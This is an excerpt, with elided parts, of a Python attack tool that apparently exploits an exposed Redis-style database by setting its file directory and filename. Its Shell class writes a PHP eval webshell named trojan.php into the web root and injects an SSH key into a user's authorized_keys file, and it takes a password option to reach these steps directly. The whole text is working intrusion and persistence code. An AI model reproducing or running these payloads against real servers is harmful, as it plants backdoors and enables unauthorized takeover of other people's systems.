...
class Check():
    ...
    def parsing(self):
        ...
        parse.add_argument('-p', help="please enter the password,")
        ...
        if args.p:
            self.PASSWORD = args.p  #######################################  存在密码直接进入选择Shell
...
class Shell():
    ...
    def Webshell(self):
        payload = '"<?php @eval($_POST[\'forever404\']); ?>"'
        dbfilename = 'trojan.php'
        dir = '/var/www/html/'
        self.write(dir=dir,dbfilename=dbfilename,payload=payload)

    def ssh(self):
        payload = r'"\n\n\nssh-rsa \n\n\n"'
        dbfilename = 'authorized_keys'
        dir = '/home/forever404/.ssh/'
        self.write(dir=dir, dbfilename=dbfilename, payload=payload)
    ...
    def bash(self):
        while True:
            ...
            if addr=='exit':
                ...
                print("your addr is {}!".format(addr))
                break
